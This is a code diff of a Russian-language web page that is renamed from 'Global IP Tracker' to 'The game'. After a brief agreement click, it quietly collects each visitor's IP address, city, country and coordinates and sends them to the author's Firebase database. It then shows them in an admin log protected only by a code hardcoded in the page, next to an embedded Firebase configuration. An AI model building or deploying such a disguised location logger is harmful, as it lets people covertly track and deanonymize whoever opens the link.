@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global IP Tracker</title>
+    <title>The game</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 90%; max-width: 600px; text-align: center; border: 1px solid #333; }
+        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 90%; max-width: 550px; text-align: center; border: 1px solid #333; }
         .hidden { display: none; }
-        button { background: #007bff; color: white; border: none; padding: 12px 24px; cursor: pointer; border-radius: 6px; font-weight: bold; transition: 0.3s; }
+        button { background: #007bff; color: white; border: none; padding: 12px 24px; cursor: pointer; border-radius: 6px; font-weight: bold; transition: 0.3s; margin-top: 10px; }
         button:hover { background: #0056b3; }
-        input { padding: 12px; width: 80%; border-radius: 6px; border: 1px solid #444; background: #252525; color: white; margin-bottom: 15px; outline: none; }
-        .log-item { text-align: left; font-size: 0.85em; background: #252525; margin-top: 8px; padding: 10px; border-left: 4px solid #007bff; border-radius: 4px; }
+        input { padding: 12px; width: 80%; border-radius: 6px; border: 1px solid #444; background: #252525; color: white; margin-bottom: 15px; outline: none; text-align: center; }
+        .log-item { text-align: left; font-size: 0.85em; background: #252525; margin-top: 10px; padding: 12px; border-left: 4px solid #007bff; border-radius: 4px; line-height: 1.5; }
         #logs { max-height: 400px; overflow-y: auto; margin-top: 20px; padding-right: 5px; }
-        .user-ip { color: #00ff88; font-family: monospace; }
+        .user-ip { color: #00ff88; font-weight: bold; }
+        .user-num { color: #ffca28; font-weight: bold; margin-right: 5px; }
+        hr { border: 0; border-top: 1px solid #333; margin: 20px 0; }
     </style>
 </head>
 <body>
@@ -21,27 +23,34 @@
 <div class="container">
     <div id="agreement-step">
         <h2>Пользовательское соглашение</h2>
-        <p>Для продолжения вы должны разрешить доступ к определению вашего IP и примерного местоположения. Эти данные будут видны администратору по коду доступа.</p>
-        <button onclick="acceptAgreement()">Я согласен и доверяю</button>
+        <p style="color: #bbb; font-size: 0.9em;">Нажимая кнопку ниже, вы подтверждаете, что согласны на предоставление данных о вашем IP-адресе, городе и координатах для отображения в статистике посещений.</p>
+        <button onclick="acceptAgreement()">Я согласен и подтверждаю</button>
     </div>
 
     <div id="code-step" class="hidden">
-        <h3>Введите секретный код</h3>
+        <h3>Доступ ограничен</h3>
+        <p>Введите секретный код, чтобы увидеть логи:</p>
         <input type="password" id="accessCode" placeholder="Ваш код доступа...">
         <br>
-        <button onclick="checkCode()">Войти в логгер</button>
+        <button onclick="checkCode()">Войти в панель</button>
     </div>
 
     <div id="result-step" class="hidden">
-        <h2>Глобальный лог посещений</h2>
+        <h2 style="color: #007bff;">Панель Администратора</h2>
+        <div id="userDataContainer">
+            <p>Ваши данные успешно записаны в базу.</p>
+        </div>
+        <hr>
         <div id="logs">Загрузка данных из Firebase...</div>
     </div>
 </div>
 
 <script type="module">
+    // Подключаем Firebase SDK
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, push, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
+    // Твой актуальный конфиг
     const firebaseConfig = { 
         apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
         authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
@@ -49,36 +58,43 @@
         storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
         messagingSenderId: "155816311480", 
         appId: "1:155816311480:web:a0456fcc4681e62837924d",
-        databaseURL: "https://flutter-ai-playground-caf0d-default-rtdb.firebaseio.com/" // Проверь этот URL в консоли!
+        databaseURL: "https://cheatip-default-rtdb.firebaseio.com" // Ссылка на твою новую базу
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
     const SECRET_CODE = "HTMLKODEYOURIP";
 
+    // Функция согласия
     window.acceptAgreement = async function() {
         document.getElementById('agreement-step').classList.add('hidden');
         await saveVisitData();
         document.getElementById('code-step').classList.remove('hidden');
     }
 
+    // Собираем данные и отправляем в Firebase
     async function saveVisitData() {
         try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             
             const visitData = {
-                ip: data.ip || "Unknown",
-                city: data.city || "Unknown",
+                ip: data.ip || "Скрыт",
+                city: data.city || "Неизвестен",
                 coords: `${data.latitude}, ${data.longitude}`,
-                time: new Date().toLocaleString('ru-RU')
+                country: data.country_name,
+                time: new Date().toLocaleString('ru-RU'),
+                timestamp: serverTimestamp() // Для правильной сортировки
             };
 
-            // Сохраняем в Firebase
+            // Пушим данные в папку "visits" в Firebase
             push(ref(db, 'visits'), visitData);
-        } catch (e) { console.error("Ошибка сохранения:", e); }
+        } catch (e) {
+            console.error("Ошибка при получении IP:", e);
+        }
     }
 
+    // Проверка кода администратора
     window.checkCode = function() {
         const input = document.getElementById('accessCode').value;
         if (input === SECRET_CODE) {
@@ -90,29 +106,34 @@
         }
     }
 
+    // Загрузка логов в реальном времени
     function loadLogs() {
         const logsDiv = document.getElementById('logs');
         const visitsRef = ref(db, 'visits');
 
-        // Слушаем изменения в базе в реальном времени
         onValue(visitsRef, (snapshot) => {
             const data = snapshot.val();
             logsDiv.innerHTML = '';
+            
             if (data) {
-                let index = 1;
-                Object.values(data).reverse().forEach(user => {
+                // Превращаем объект в массив и разворачиваем (последние сверху)
+                const items = Object.values(data).reverse();
+                
+                items.forEach((user, index) => {
+                    const totalCount = items.length;
                     const item = document.createElement('div');
                     item.className = 'log-item';
                     item.innerHTML = `
-                        <strong>#${index}</strong> | <span>${user.time}</span><br>
-                        IP: <span class="user-ip">${user.ip}</span> | Город: ${user.city}<br>
-                        Координаты: <small>${user.coords}</small>
+                        <span class="user-num">#${totalCount - index}</span> 
+                        <span style="color: #888;">${user.time}</span><br>
+                        <strong>IP:</strong> <span class="user-ip">${user.ip}</span><br>
+                        <strong>Место:</strong> ${user.city}, ${user.country || ''}<br>
+                        <strong>Координаты:</strong> <small style="color: #aaa;">${user.coords}</small>
                     `;
                     logsDiv.appendChild(item);
-                    index++;
                 });
             } else {
-                logsDiv.innerText = 'Записей пока нет.';
+                logsDiv.innerText = 'В базе пока нет записей.';
             }
         });
     }
